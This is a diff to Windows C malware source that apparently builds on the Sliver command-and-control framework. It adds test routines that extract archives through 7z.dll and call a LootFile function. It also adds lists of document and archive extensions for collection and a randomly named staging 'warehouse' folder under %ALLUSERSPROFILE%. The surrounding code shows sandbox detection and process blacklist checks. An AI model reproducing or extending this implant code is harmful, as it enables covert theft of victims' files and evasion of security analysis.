@@ -2471,6 +2471,207 @@ void test150(void) {
 	ListFileEx(L"C:\\Users\\Admin\\Desktop", LIST_JUST_FOLDER, NULL, NULL);
 }
 
+void test151(void) {
+	HMODULE h7zDll = NULL;
+	CREATEOBJECT fnCreateObject = NULL;
+	CREATEDECODER fnCreateDecoder = NULL;
+	GUID IID_IInArchive = { 0x23170F69, 0x40C1, 0x278A, { 0, 0, 0, 6, 0, 0x60, 0 } };
+	GUID IID_IInStream = { 0x23170F69, 0x40C1, 0x278A, { 0, 0, 0, 3, 0, 3, 0 } };
+	GUID IID_ICompressCoder = { 0x23170F69, 0x40C1, 0x278A, { 0, 0, 0, 4, 0, 5, 0 } };
+	HRESULT hResult = S_OK;
+	WCHAR wszPath[] = L"C:\\Users\\Admin\\Downloads\\idasdk_pro83.zip";
+	PBYTE pBuffer = NULL;
+	DWORD cbBuffer = 0;
+	PGUID pFormatGUID = NULL;
+	UINT64 uSignature = 0;
+	IInArchive* pInArchive = NULL;
+	DWORD dwNumberOfItems = 0;
+	IInStream* InStream = NULL;
+	UINT64 uMaxCheckStartPosition = 0;
+	DWORD i = 0;
+	PROPVARIANT ItemProperty;
+	LPVOID lpObj = NULL;
+	PUINT32 pIndices = NULL;
+	IArchiveExtractCallback* pArchiveExtractCallback = NULL;
+	PITEM_INFO* ItemList = NULL;
+
+	h7zDll = LoadLibraryA("D:\\Temp\\sevenzip-master\\CPP\\7zip\\Bundles\\Format7zF\\x64\\7z.dll");
+	if (h7zDll == NULL) {
+		LOG_ERROR("LoadLibraryA", GetLastError());
+		goto CLEANUP;
+	}
+
+	pBuffer = ReadFromFile(wszPath, &cbBuffer);
+	if (pBuffer == NULL) {
+		goto CLEANUP;
+	}
+
+	memcpy(&uSignature, pBuffer, sizeof(uSignature));
+	pFormatGUID = FindFormatBySignature(_byteswap_uint64(uSignature));
+	if (pFormatGUID == NULL) {
+		goto CLEANUP;
+	}
+
+	fnCreateObject = (CREATEOBJECT)GetProcAddress(h7zDll, "CreateObject");
+	fnCreateDecoder = (CREATEDECODER)GetProcAddress(h7zDll, "CreateDecoder");
+	hResult = fnCreateObject(pFormatGUID, &IID_IInArchive, &pInArchive);
+	if (FAILED(hResult)) {
+		LOG_ERROR("CreateObject", hResult);
+		goto CLEANUP;
+	}
+	
+	InStream = ALLOC(sizeof(IInStream));
+	InStream->pBuffer = ALLOC(sizeof(BUFFER));
+	InStream->pBuffer->pBuffer = ReadFromFile(wszPath, &InStream->pBuffer->cbBuffer);
+	if (InStream->pBuffer == NULL) {
+		goto CLEANUP;
+	}
+
+	InStream->vtbl = ALLOC(sizeof(struct IInStreamVtbl));
+	InStream->vtbl->QueryInterface = IInStream_QueryInterface;
+	InStream->vtbl->AddRef = IInStream_AddRef;
+	InStream->vtbl->Release = IInStream_Release;
+	InStream->vtbl->Read = IInStream_Read;
+	InStream->vtbl->Seek = IInStream_Seek;
+	hResult = pInArchive->vtbl->Open(pInArchive, InStream, &uMaxCheckStartPosition, NULL);
+	if (FAILED(hResult)) {
+		LOG_ERROR("pInArchive->Open", hResult);
+		goto CLEANUP;
+	}
+
+	hResult = pInArchive->vtbl->GetNumberOfItems(pInArchive, &dwNumberOfItems);
+	if (FAILED(hResult)) {
+		LOG_ERROR("pInArchive->GetNumberOfItems", hResult);
+		goto CLEANUP;
+	}
+
+	ItemList = ALLOC(sizeof(PITEM_INFO) * dwNumberOfItems);
+	pIndices = ALLOC(sizeof(UINT32) * dwNumberOfItems);
+	for (i = 0; i < dwNumberOfItems; i++) {
+		ItemList[i] = ALLOC(sizeof(ITEM_INFO));
+		pIndices[i] = i;
+
+		PropVariantInit(&ItemProperty);
+		hResult = pInArchive->vtbl->GetProperty(pInArchive, i, 3, &ItemProperty);
+		if (FAILED(hResult)) {
+			LOG_ERROR("pInArchive->GetProperty", hResult);
+			goto CONTINUE;
+		}
+
+		if (ItemProperty.vt != VT_BSTR) {
+			PropVariantClear(&ItemProperty);
+			goto CONTINUE;
+		}
+
+		ItemList[i]->lpPath = DuplicateStrW(ItemProperty.bstrVal, 0);
+		PropVariantClear(&ItemProperty);
+		PropVariantInit(&ItemProperty);
+		hResult = pInArchive->vtbl->GetProperty(pInArchive, i, 6, &ItemProperty);
+		if (FAILED(hResult)) {
+			LOG_ERROR("pInArchive->GetProperty", hResult);
+			goto CONTINUE;
+		}
+
+		if (ItemProperty.vt != VT_BOOL) {
+			PropVariantClear(&ItemProperty);
+			goto CONTINUE;
+		}
+
+		ItemList[i]->IsDir = ItemProperty.boolVal == VARIANT_TRUE;
+		PropVariantInit(&ItemProperty);
+		hResult = pInArchive->vtbl->GetProperty(pInArchive, i, 15, &ItemProperty);
+		if (FAILED(hResult)) {
+			LOG_ERROR("pInArchive->GetProperty", hResult);
+			goto CONTINUE;
+		}
+
+		if (ItemProperty.vt != VT_BOOL) {
+			PropVariantClear(&ItemProperty);
+			goto CONTINUE;
+		}
+
+		ItemList[i]->IsEncrypted = ItemProperty.boolVal == VARIANT_TRUE;
+		PropVariantInit(&ItemProperty);
+		hResult = pInArchive->vtbl->GetProperty(pInArchive, i, 9, &ItemProperty);
+		if (FAILED(hResult)) {
+			LOG_ERROR("pInArchive->GetProperty", hResult);
+			goto CONTINUE;
+		}
+
+		ItemList[i]->IsSymLink = (ItemProperty.uintVal & FILE_ATTRIBUTE_REPARSE_POINT) == FILE_ATTRIBUTE_REPARSE_POINT;
+		PropVariantClear(&ItemProperty);
+		if (!ItemList[i]->IsDir) {
+			ItemList[i]->pFileData = ALLOC(sizeof(BUFFER));
+			PropVariantInit(&ItemProperty);
+			hResult = pInArchive->vtbl->GetProperty(pInArchive, i, 7, &ItemProperty);
+			if (FAILED(hResult)) {
+				LOG_ERROR("pInArchive->GetProperty", hResult);
+				continue;
+			}
+
+			ItemList[i]->pFileData->cbBuffer = ItemProperty.uintVal;
+			ItemList[i]->pFileData->pBuffer = ALLOC(ItemList[i]->pFileData->cbBuffer + 1);
+			PropVariantClear(&ItemProperty);
+		}
+
+		continue;
+CONTINUE:
+		FreeItemInfo(ItemList[i]);
+		ItemList[i] = NULL;
+	}
+
+	pArchiveExtractCallback = ALLOC(sizeof(IArchiveExtractCallback));
+	pArchiveExtractCallback->vtbl = ALLOC(sizeof(struct IArchiveExtractCallbackVtbl));
+	pArchiveExtractCallback->vtbl->AddRef = IArchiveExtractCallback_AddRef;
+	pArchiveExtractCallback->vtbl->QueryInterface = IArchiveExtractCallback_QueryInterface;
+	pArchiveExtractCallback->vtbl->Release = IArchiveExtractCallback_Release;
+	pArchiveExtractCallback->vtbl->GetStream = IArchiveExtractCallback_GetStream;
+	pArchiveExtractCallback->vtbl->PrepareOperation = IArchiveExtractCallback_PrepareOperation;
+	pArchiveExtractCallback->vtbl->SetOperationResult = IArchiveExtractCallback_SetOperationResult;
+	pArchiveExtractCallback->vtbl->SetCompleted = IArchiveExtractCallback_SetCompleted;
+	pArchiveExtractCallback->vtbl->SetTotal = IArchiveExtractCallback_SetTotal;
+	pArchiveExtractCallback->ItemList = ItemList;
+	pInArchive->vtbl->Extract(pInArchive, pIndices, dwNumberOfItems, 0, pArchiveExtractCallback);
+	if (FAILED(hResult)) {
+		LOG_ERROR("pInArchive->Extract", hResult);
+		goto CLEANUP;
+	}
+
+CLEANUP:
+	if (pArchiveExtractCallback != NULL) {
+		pArchiveExtractCallback->vtbl->Release(pArchiveExtractCallback);
+		FREE(pArchiveExtractCallback->vtbl);
+		FREE(pArchiveExtractCallback);
+	}
+	
+	if (pInArchive != NULL) {
+		pInArchive->vtbl->Release(pInArchive);
+	}
+
+	if (InStream != NULL) {
+		InStream->vtbl->Release(InStream);
+		FREE(InStream->vtbl);
+		FREE(InStream);
+	}
+
+	FREE(pFormatGUID);
+	FREE(pBuffer);
+
+	return;
+}
+
+void test152(void) {
+	PITEM_INFO* ItemList = NULL;
+	DWORD dwNumberOfItems = 0;
+
+	ItemList = ExtractFromZip(L"C:\\Users\\Admin\\Downloads\\QD3.rar", "D:\\Temp\\sevenzip-master\\CPP\\7zip\\Bundles\\Format7zF\\x64\\7z.dll", TRUE, &dwNumberOfItems);
+}
+
+void test153(void) {
+	LootFile(NULL);
+	Sleep(10000000);
+}
+
 BOOL IsExist
 (
 	PGLOBAL_CONFIG pConfig
@@ -2564,9 +2765,12 @@ VOID Final(VOID)
 	DWORD cchSliverPath = 0;
 	PGLOBAL_CONFIG pGlobalConfig = NULL;
 	PSLIVER_SESSION_CLIENT pSessionClient = NULL;
-	PSLIVER_SESSION_CLIENT pBeaconClient = NULL;
+	PSLIVER_BEACON_CLIENT pBeaconClient = NULL;
 	WCHAR wszConfigPath[MAX_PATH];
 	LPWSTR lpTemp = NULL;
+	LPWSTR DocumentExtensions[] = { L"doc", L"docm", L"docx", L"pdf", L"ppsm", L"ppsx", L"ppt", L"pptm", L"pptx", L"pst", L"rtf", L"xlm", L"xls", L"xlsm", L"xlsx", L"odt", L"ods", L"odp", L"odg", L"odf" };
+	LPWSTR ArchiveExtensions[] = { L"rar", L"zip", L"tar", L"gz", L"xz", L"sz", L"7z" };
+	DWORD i = 0;
 
 #ifndef _DEBUG
 	if (DetectSandbox4() || DetectSandbox5() || CheckForBlackListProcess()) {
@@ -2592,6 +2796,23 @@ VOID Final(VOID)
 	pGlobalConfig->uPeerID = GeneratePeerID();
 	pGlobalConfig->dwListenerID = 1;
 	pGlobalConfig->hCurrentToken = GetCurrentProcessToken();
+	pGlobalConfig->DocumentExtensions = ALLOC(sizeof(LPWSTR) * _countof(DocumentExtensions));
+	pGlobalConfig->cDocumentExtensions = _countof(DocumentExtensions);
+	for (i = 0; i < _countof(DocumentExtensions); i++) {
+		pGlobalConfig->DocumentExtensions[i] = DuplicateStrW(DocumentExtensions[i], 0);
+	}
+
+	pGlobalConfig->ArchiveExtensions = ALLOC(sizeof(LPWSTR) * _countof(ArchiveExtensions));
+	pGlobalConfig->cArchiveExtensions = _countof(ArchiveExtensions);
+	for (i = 0; i < _countof(ArchiveExtensions); i++) {
+		pGlobalConfig->ArchiveExtensions[i] = DuplicateStrW(ArchiveExtensions[i], 0);
+	}
+
+	ExpandEnvironmentStringsW(L"%ALLUSERSPROFILE%", pGlobalConfig->wszWarehouse, _countof(pGlobalConfig->wszWarehouse));
+	lpTemp = GenRandomStrW(8);
+	lstrcatW(pGlobalConfig->wszWarehouse, L"\\");
+	lstrcatW(pGlobalConfig->wszWarehouse, lpTemp);
+	FREE(lpTemp);
 	if (IsExist(pGlobalConfig)) {
 		goto CLEANUP;
 	}
@@ -2911,7 +3132,10 @@ int WinMain
 	//test148();
 	//test149();
 	//test150();
-	Final();
+	//test151();
+	//test152();
+	test153();
+	//Final();
 	//WaitForSingleObject(hThread, INFINITE);
 CLEANUP:
 	if (hThread != NULL) {
